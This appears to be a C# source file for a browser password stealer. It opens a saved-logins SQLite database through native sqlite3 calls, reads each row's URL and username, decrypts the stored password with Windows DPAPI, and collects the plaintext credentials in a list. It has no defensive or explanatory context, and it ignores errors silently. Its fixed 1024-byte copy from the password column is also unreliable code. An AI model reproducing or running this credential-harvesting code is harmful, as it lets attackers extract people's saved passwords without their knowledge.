using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApplication19
{
    public class LoginData
    {
        public string Url { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }

    class SQParse
    {
        #region DllImport
        [DllImport("sqlite3", EntryPoint = "sqlite3_open_v2", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_open(byte[] filename, out IntPtr db, int flags, IntPtr zvfs);
        [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_prepare_v2(IntPtr db, [MarshalAs(UnmanagedType.LPStr)] string sql, int numBytes, out IntPtr stmt, IntPtr pzTail);
        [DllImport("sqlite3", EntryPoint = "sqlite3_finalize", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_finalize(IntPtr stmt);
        [DllImport("sqlite3", EntryPoint = "sqlite3_column_text", CallingConvention = CallingConvention.Cdecl)]
        private static extern IntPtr sqlite3_column_text(IntPtr stmt, int index);
        [DllImport("sqlite3", EntryPoint = "sqlite3_close", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_close(IntPtr db);
        [DllImport("sqlite3", EntryPoint = "sqlite3_step", CallingConvention = CallingConvention.Cdecl)]
        private static extern int sqlite3_step(IntPtr stmt);
        #endregion

        public static List<LoginData> ParseFile(string FileName)
        {
            List<LoginData> LoginDataList = new List<LoginData>();
            if (File.Exists(FileName))
            {
                IntPtr DbHandle = IntPtr.Zero, Stmt = IntPtr.Zero;
                if (sqlite3_open(GetNullTerminatedUtf8(FileName), out DbHandle, 1, IntPtr.Zero) == 0)
                {
                    if (sqlite3_prepare_v2(DbHandle, "SELECT * FROM Logins", 24, out Stmt, IntPtr.Zero) == 0)
                    {
                        byte[] Entropy = null;
                        string Description = String.Empty;
                        for (int i = 0; sqlite3_step(Stmt) == 100; i++)
                        {
                            try
                            {
                                string ULink = Marshal.PtrToStringAnsi(sqlite3_column_text(Stmt, 1));
                                string ULogin = Marshal.PtrToStringAnsi(sqlite3_column_text(Stmt, 3));
                                byte[] Crypted = new byte[1024];
                                IntPtr PassPointer = sqlite3_column_text(Stmt, 5);
                                Marshal.Copy(PassPointer, Crypted, 0, Crypted.Length);
                                byte[] UDecrypted = DpApi.Decrypt(Crypted, Entropy, out Description);
                                string UPassword = Encoding.UTF8.GetString(UDecrypted);
                                LoginDataList.Add(new LoginData { Url = ULink, Login = ULogin, Password = UPassword });
                            }
                            catch { }
                        }
                        sqlite3_finalize(Stmt);
                    }
                    sqlite3_close(DbHandle);
                }
            }
            return LoginDataList;
        }

        private static byte[] GetNullTerminatedUtf8(string s)
        {
            var utf8Length = System.Text.Encoding.UTF8.GetByteCount(s);
            var bytes = new byte[utf8Length + 1];
            utf8Length = System.Text.Encoding.UTF8.GetBytes(s, 0, s.Length, bytes, 0);
            return bytes;
        }
    }
}